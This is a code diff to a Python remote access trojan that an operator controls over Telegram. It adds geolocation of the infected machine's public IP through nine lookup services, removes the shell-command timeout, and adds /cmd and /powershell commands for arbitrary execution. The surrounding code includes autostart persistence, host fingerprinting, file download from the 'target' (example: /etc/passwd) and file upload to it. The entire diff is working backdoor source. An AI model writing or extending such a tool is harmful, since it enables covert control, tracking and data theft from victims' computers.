@@ -1,5 +1,5 @@
 # -*- coding: utf-8 -*-
-import asyncio,atexit,getpass,logging,os,platform,random,shutil,signal,socket,string,subprocess,sys,time,urllib.request,uuid
+import asyncio,atexit,getpass,json,logging,os,platform,random,shutil,signal,socket,string,subprocess,sys,time,urllib.request,uuid
 from pathlib import Path
 from aiogram import Bot,Dispatcher,F
 from aiogram.exceptions import TelegramConflictError,TelegramUnauthorizedError
@@ -152,6 +152,39 @@ def autostart_install():
   if IS_MAC:return _autostart_macos(t)
   return _autostart_linux(t)
  except Exception as e:return f"⚠️ install err: {e}"
+def _flag(cc):
+ if not cc or len(cc)!=2:return"🏳️"
+ try:return"".join(chr(0x1F1E6+ord(c.upper())-65)for c in cc)
+ except:return"🏳️"
+def get_geo_info():
+ # Tries multiple geo-IP APIs in order; returns "IP / flag country city (lat, lon)".
+ # Each entry: (URL, [ip_key, cc_key, country_key, city_key, lat_key, lon_key]).
+ apis=[
+  ("https://ipwho.is/",("ip","country_code","country","city","latitude","longitude")),
+  ("https://ipapi.co/json/",("ip","country_code","country_name","city","latitude","longitude")),
+  ("https://freeipapi.com/api/json",("ipAddress","countryCode","countryName","cityName","latitude","longitude")),
+  ("https://get.geojs.io/v1/ip/geo.json",("ip","country_code","country","city","latitude","longitude")),
+  ("https://api.ip.sb/geoip",("ip","country_code","country","city","latitude","longitude")),
+  ("http://ipwhois.app/json/",("ip","country_code","country","city","latitude","longitude")),
+  ("http://ip-api.com/json/",("query","countryCode","country","city","lat","lon")),
+  ("https://ipinfo.io/json",("ip","country","country","city",None,None)),
+  ("https://api.myip.com",("ip","cc","country",None,None,None)),
+ ]
+ for url,keys in apis:
+  try:
+   with urllib.request.urlopen(url,timeout=6)as r:
+    d=json.loads(r.read().decode("utf-8",errors="replace"))
+   ip=d.get(keys[0])
+   if not ip:continue
+   cc=d.get(keys[1])or""
+   country=d.get(keys[2])or"?"
+   city=d.get(keys[3])or"?"
+   lat=d.get(keys[4])if keys[4]else None
+   lon=d.get(keys[5])if keys[5]else None
+   coords=f" ({lat}, {lon})"if lat is not None and lon is not None else""
+   return f"🌍 Public IP: {ip}\n{_flag(cc)} {country}, {city}{coords}"
+  except:pass
+ return"🌍 Public IP: unknown"
 def get_public_ip():
  for u in("https://api.ipify.org","https://ifconfig.me/ip","https://icanhazip.com"):
   try:
@@ -168,7 +201,7 @@ def get_mac():
 def get_device_info():
  try:u=getpass.getuser()
  except:u="unknown"
- try:return"\n".join([f"🖥 Host: {platform.node()}",f"👤 User: {u}",f"💻 OS: {platform.system()} {platform.release()} ({platform.version()})",f"🏗 Architecture: {platform.machine()}",f"🌐 Local IP: {get_local_ip()}",f"🌍 Public IP: {get_public_ip()}",f"🔗 MAC: {get_mac()}",f"📁 CWD: {os.getcwd()}",f"📂 Installed: {_read_install_path()or'❌'}",f"🛡 Admin: {is_admin()}",f"🐧 Platform: {'win' if IS_WIN else 'mac' if IS_MAC else 'linux'}",f"\n",f"Type /help to see command list."])
+ try:return"\n".join([f"🖥 Host: {platform.node()}",f"👤 User: {u}",f"💻 OS: {platform.system()} {platform.release()} ({platform.version()})",f"🏗 Architecture: {platform.machine()}",f"🌐 Local IP: {get_local_ip()}",get_geo_info(),f"🔗 MAC: {get_mac()}",f"📁 CWD: {os.getcwd()}",f"📂 Installed: {_read_install_path()or'❌'}",f"🛡 Admin: {is_admin()}",f"🐧 Platform: {'win' if IS_WIN else 'mac' if IS_MAC else 'linux'}",f"\n",f"Type /help to see command list."])
  except Exception as e:return f"[device info error: {e}]"
 async def build_online_message():
  try:i=await asyncio.to_thread(get_device_info)
@@ -176,8 +209,19 @@ async def build_online_message():
  return f"🟢 [{CLIENT_NAME}] ONLINE!\n\n{i}"
 def run_cmd(c):
  try:
-  r=subprocess.run(c,shell=True,capture_output=True,timeout=60);o=_dec((r.stdout or b"")+(r.stderr or b"")).strip();return o or f"[empty, rc={r.returncode}]"
- except subprocess.TimeoutExpired:return"[timeout > 60s]"
+  r=subprocess.run(c,shell=True,capture_output=True);o=_dec((r.stdout or b"")+(r.stderr or b"")).strip();return o or f"[empty, rc={r.returncode}]"
+ except Exception as e:return f"[error: {e}]"
+def run_cmd_cmdline(c):
+ try:
+  if IS_WIN:r=subprocess.run(["cmd.exe","/c",c],capture_output=True)
+  else:r=subprocess.run(c,shell=True,capture_output=True)
+  o=_dec((r.stdout or b"")+(r.stderr or b"")).strip();return o or f"[empty, rc={r.returncode}]"
+ except Exception as e:return f"[error: {e}]"
+def run_cmd_ps(c):
+ if not IS_WIN:return"[powershell] only supported on Windows"
+ try:
+  r=subprocess.run(["powershell","-NoProfile","-NonInteractive","-Command",c],capture_output=True)
+  o=_dec((r.stdout or b"")+(r.stderr or b"")).strip();return o or f"[empty, rc={r.returncode}]"
  except Exception as e:return f"[error: {e}]"
 def split_msg(t,l=4000):
  for i in range(0,len(t),l):yield t[i:i+l]
@@ -223,7 +267,7 @@ async def cmd_start(m):
 async def cmd_help(m):
  try:
   if not is_adm(m):return await m.answer("⛔ Access denied")
-  await m.answer(f"📖 [{CLIENT_NAME}] commands\n\n/start — host info\n/heartbeat — liveness probe (uptime, PID, offline flag)\n/help — this message\n/getfile <path> — download a file from the target\n    example: /getfile C:\\Users\\Public\\log.txt\n    example: /getfile /etc/passwd\n/putfile <dir> — upload a file from Telegram into <dir>\n    example: /putfile C:\\Users\\Public\n    example: /putfile /tmp\n    (bot will then ask you to send the file)\n\nanything else — shell command\n    example: dir\n    example: ps aux | head\n\nlimits:\n  • max upload: {MAX_UPLOAD//(1024*1024)} MB per file\n  • command timeout: 60s")
+  await m.answer(f"📖 [{CLIENT_NAME}] commands\n\n/start — host info + geo\n/heartbeat — liveness probe (uptime, PID, offline flag)\n/help — this message\n/getfile <path> — download a file from the target\n    example: /getfile C:\\Users\\Public\\log.txt\n/putfile <dir> — upload a file from Telegram into <dir>\n    example: /putfile C:\\Users\\Public\n    (bot will then ask you to send the file)\n/cmd <command> — run via cmd.exe (Windows) / sh (Unix)\n    example: /cmd dir\n/powershell <command> — run via PowerShell (Windows only)\n    example: /powershell Get-Process | Select -First 5\n\nanything else — shell command (no timeout)\n    example: dir\n    example: ps aux | head\n\nlimits:\n  • max upload: {MAX_UPLOAD//(1024*1024)} MB per file")
  except:pass
 @dp.message(Command("getfile"))
 async def cmd_getfile(m):
@@ -280,6 +324,32 @@ async def cmd_heartbeat(m):
   if not is_adm(m):return await m.answer("⛔ Access denied")
   up=int(time.time()-_start_ts);h,rem=divmod(up,3600);mn,sc=divmod(rem,60)
   await m.answer(f"💓 [{CLIENT_NAME}] alive\n⏱ uptime: {h}h {mn}m {sc}s\n🆔 pid: {os.getpid()}\n📡 offline flag: {_offline}\n🛡 admin: {is_admin()}\n🐧 platform: {'win' if IS_WIN else 'mac' if IS_MAC else 'linux'}")
+ except:pass
+@dp.message(Command("cmd"))
+async def cmd_cmd(m):
+ try:
+  if not is_adm(m):return await m.answer("⛔ Access denied")
+  parts=(m.text or"").strip().split(maxsplit=1)
+  if len(parts)<2 or not parts[1].strip():return await m.answer("usage: /cmd <command>\nexample: /cmd dir")
+  o=await asyncio.to_thread(run_cmd_cmdline,parts[1].strip())
+  for ch in split_msg(o):
+   try:await m.answer(f"[{CLIENT_NAME}]\n```\n{ch}\n```",parse_mode="Markdown")
+   except:
+    try:await m.answer(f"[{CLIENT_NAME}] {ch}")
+    except:pass
+ except:pass
+@dp.message(Command("powershell"))
+async def cmd_ps(m):
+ try:
+  if not is_adm(m):return await m.answer("⛔ Access denied")
+  parts=(m.text or"").strip().split(maxsplit=1)
+  if len(parts)<2 or not parts[1].strip():return await m.answer("usage: /powershell <command>\nexample: /powershell Get-Process | Select -First 5")
+  o=await asyncio.to_thread(run_cmd_ps,parts[1].strip())
+  for ch in split_msg(o):
+   try:await m.answer(f"[{CLIENT_NAME}]\n```\n{ch}\n```",parse_mode="Markdown")
+   except:
+    try:await m.answer(f"[{CLIENT_NAME}] {ch}")
+    except:pass
  except:pass
 @dp.message(F.text)
 async def cmd_exec(m):
